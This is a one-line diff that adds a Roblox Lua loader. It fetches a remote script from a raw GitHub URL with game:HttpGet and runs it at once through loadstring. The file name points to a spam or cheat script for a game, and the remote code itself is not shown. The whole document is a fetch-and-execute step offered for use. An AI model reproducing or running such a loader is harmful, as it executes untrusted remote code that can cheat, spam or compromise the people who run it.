@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/interrogation-ai-spam7-vburf1qojq3k74.lua"))()
